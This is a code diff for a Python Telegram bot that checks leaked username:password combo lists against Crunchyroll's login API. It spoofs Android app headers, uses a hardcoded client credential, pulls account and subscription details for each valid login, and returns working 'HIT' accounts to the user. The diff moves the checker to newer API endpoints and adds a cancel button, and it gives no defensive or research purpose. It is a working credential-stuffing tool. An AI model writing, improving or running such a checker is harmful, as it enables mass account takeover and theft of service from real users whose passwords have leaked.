@@ -10,14 +10,14 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 hits = []
 dead = []
-stop_process = False
+cancel_check = False
 
 def process_crunchytxt_command(bot, message):
     bot.send_message(message.chat.id, "Please send your txt file with combo data.")
 
-def handle_docs(bot, message):
-    global stop_process
-    stop_process = False
+def handle_crunchytxt_docs(bot, message):
+    global cancel_check
+    cancel_check = False
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
@@ -31,12 +31,12 @@ def handle_docs(bot, message):
         total_combos = len(combo_list)
         start_time = time.time()
 
-        # Creating inline keyboard for showing results
+        # Creating inline keyboard for showing results and cancel button
         keyboard = types.InlineKeyboardMarkup(row_width=1)
         keyboard.add(
-            types.InlineKeyboardButton(text="HIT ✅", callback_data='hit'),
-            types.InlineKeyboardButton(text="Dead ❌", callback_data='dead'),
-            types.InlineKeyboardButton(text="Cancel ❌", callback_data='cancel')
+            types.InlineKeyboardButton(text="HIT ✅", callback_data='hit_crunchytxt'),
+            types.InlineKeyboardButton(text="Dead ❌", callback_data='dead_crunchytxt'),
+            types.InlineKeyboardButton(text="Cancel ❌", callback_data='cancel_crunchytxt')
         )
 
         initial_message = (
@@ -55,14 +55,12 @@ def handle_docs(bot, message):
 
         msg = bot.send_message(message.chat.id, initial_message, reply_markup=keyboard)
 
-        hits.clear()
-        dead.clear()
+        hits = []
+        dead = []
 
         for combo in combo_list:
-            if stop_process:
-                bot.send_message(message.chat.id, "Process canceled by user.")
+            if cancel_check:
                 break
-
             if ':' in combo:
                 user, pwd = combo.strip().split(':', 1)
                 result = check_crunchytxt_combo(user, pwd)
@@ -84,25 +82,26 @@ def handle_docs(bot, message):
                     f"⚡️ Bot by - AFTAB 👑\n"
                     f"－－－－－－－－－－－－－－－－"
                 )
+                # Adding a unique timestamp to ensure the message content is always different
+                current_message += f"\nLast checked at: {time.time()}"
                 bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
             else:
                 dead.append((combo.strip(), "Invalid format"))
 
-        if not stop_process:
-            bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
+        bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
 
     except Exception as e:
         bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
 
-def handle_callback_query(call, bot):
-    global stop_process
-    if call.data == 'hit':
+def handle_crunchytxt_callback_query(call, bot):
+    global cancel_check
+    if call.data == 'hit_crunchytxt':
         send_combos(call.message.chat.id, hits, bot, "HIT ✅ Combos")
-    elif call.data == 'dead':
+    elif call.data == 'dead_crunchytxt':
         send_combos(call.message.chat.id, dead, bot, "Dead ❌ Combos")
-    elif call.data == 'cancel':
-        stop_process = True
-        bot.send_message(call.message.chat.id, "Process canceled by user.")
+    elif call.data == 'cancel_crunchytxt':
+        cancel_check = True
+        bot.send_message(call.message.chat.id, "Process has been canceled.")
 
 def send_combos(chat_id, combos, bot, title):
     if combos:
@@ -112,45 +111,57 @@ def send_combos(chat_id, combos, bot, title):
         bot.send_message(chat_id, f"No {title} found.")
 
 def check_crunchytxt_combo(user, pwd):
-    session = requests.Session()
-    user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
-
+    login_url = "https://beta-api.crunchyroll.com/auth/v1/token"
     headers = {
-        "scheme": "https",
-        "accept": "application/json, text/plain, */*",
-        "accept-encoding": "gzip, deflate, br",
-        "accept-language": "en-US,en;q=0.9",
-        "content-length": "54",
-        "content-type": "application/json;charset=UTF-8",
-        "origin": "https://www.crunchyroll.com",
-        "referer": "https://www.crunchyroll.com/",
-        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
-        "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": "\"Windows\"",
-        "sec-fetch-dest": "empty",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "cross-site",
-        "user-agent": user_agent
+        "Authorization": "Basic Z3N1ZnB0YjBmYW43dGFndG1ub3I6UUU1djBqc3Y5OVhNY2xadVNPX0Jfem1wOE03YlBfMnM=",
+        "Connection": "Keep-Alive",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "ETP-Anonymous-Id": "b10da375-d759-47ce-aa9e-d666157c4325",
+        "Host": "beta-api.crunchyroll.com",
+        "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
+    }
+    data = {
+        'username': user,
+        'password': pwd,
+        'grant_type': 'password',
+        'scope': 'offline_access',
+        'device_id': 'a6856484-cbcd-46f5-99b9-db8cff57ec17',
+        'device_name': 'SM-G988N',
+        'device_type': 'samsung SM-G9810'
     }
 
-    data = json.dumps({"email": user, "password": pwd})
-    response = session.post("https://api.crunchyroll.com/login", headers=headers, data=data)
+    response = requests.post(login_url, headers=headers, data=data)
+    response_data = response.json()
 
-    if response.status_code == 200 and "auth_token" in response.json():
-        auth_token = response.json().get("auth_token")
-        headers["authorization"] = f"Bearer {auth_token}"
+    if 'access_token' in response_data:
+        access_token = response_data['access_token']
 
-        # Account info URL
-        account_info_url = "https://api.crunchyroll.com/accounts/me"
-        account_info_response = session.get(account_info_url, headers=headers)
+        # Second request to get account information
+        account_info_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
+        account_info_headers = {
+            "Authorization": f"Bearer {access_token}",
+            "Connection": "Keep-Alive",
+            "Host": "beta-api.crunchyroll.com",
+            "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
+        }
+
+        account_info_response = requests.get(account_info_url, headers=account_info_headers)
         account_info_data = account_info_response.json()
 
         email_verified = account_info_data.get('email_verified', 'N/A')
-        account_creation_date = account_info_data.get('created_at', 'N/A')
+        account_creation_date = account_info_data.get('created', 'N/A')[:10]
+        external_id = account_info_data.get('external_id', 'N/A')
 
-        # Subscription info URL
-        subscription_info_url = "https://api.crunchyroll.com/subscription"
-        subscription_info_response = session.get(subscription_info_url, headers=headers)
+        # Third request to get subscription information
+        subscription_info_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"
+        subscription_info_headers = {
+            "Authorization": f"Bearer {access_token}",
+            "Connection": "Keep-Alive",
+            "Host": "beta-api.crunchyroll.com",
+            "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
+        }
+
+        subscription_info_response = requests.get(subscription_info_url, headers=subscription_info_headers)
         subscription_info_data = subscription_info_response.json()
 
         subscription_name = subscription_info_data.get('sku', 'Subscription Not Found')
